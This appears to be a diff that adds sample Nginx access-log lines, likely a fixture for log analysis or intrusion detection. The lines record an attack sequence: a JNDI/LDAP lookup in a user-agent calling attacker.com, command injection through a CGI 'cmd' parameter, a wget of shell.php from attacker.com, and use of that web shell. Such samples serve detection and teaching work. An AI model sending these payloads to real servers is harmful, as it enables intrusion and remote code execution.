@@ -1,1 +1,5 @@
-Nginx Access Logs
+192.168.1.45 - - [11/May/2026:09:10:01 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0"
+192.168.1.45 - - [11/May/2026:09:10:05 +0000] "POST /login HTTP/1.1" 200 5312 "-" "${jndi:ldap://attacker.com/a}"
+192.168.1.45 - - [11/May/2026:09:10:10 +0000] "GET /cgi-bin/test.cgi?cmd=ls%20-la%20/tmp HTTP/1.1" 200 452 "-" "python-requests/2.25.1"
+192.168.1.45 - - [11/May/2026:09:10:15 +0000] "GET /cgi-bin/test.cgi?cmd=wget%20http://attacker.com/shell.php HTTP/1.1" 200 121 "-" "python-requests/2.25.1"
+192.168.1.45 - - [11/May/2026:09:11:02 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 34 "-" "Mozilla/5.0"
